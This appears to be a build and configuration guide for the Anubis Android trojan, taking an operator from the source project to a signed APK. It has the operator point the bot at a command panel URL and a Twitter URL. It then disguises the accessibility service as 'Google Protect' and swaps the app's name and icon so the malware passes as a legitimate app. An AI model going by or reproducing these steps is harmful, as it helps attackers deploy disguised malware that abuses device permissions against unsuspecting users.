1. Install Android Studio
2. Open Android Studio
3. Import project(Gradle, Eclipse ADT, etc) -> Folder "anubisSource"
4. If you ask to update your Android Studio, update it!
5. Open app >> java >> anubis >> bot >> myapplication >> Constants
6. Settings bot: 
 public final String urls = "http://URL_PANEL.COM";
 public final String urlTwitter = "URL Twiiter";
 public final String key_post = "1day"; //key traffic
 public final String Version = "tag";
 public final String nameAccessibilityService = "Google Protect";

7. Оpen the manifest, enable search and find the text "Google Protect" replace with your name!

8. Replace name application. Open manifest -> find text "android:label="nameApp", replace "nameApp"

9. Replace icon application. Open folder res -> mipmap -> ic_launcher -> Replace all file icon!

10. Build APK File! Open Build -> Generate Signed Bundle / APK..., check APK -> NEXT
Click button "Create new...", fill in the data "New Key Store", -> NEXT -> list check "release", check "V1" and "V2" -> click button "Finish"

11.  Wait when the APK file will gather!

12. Open Folder anubisSource -> app -> release -> app-release.apk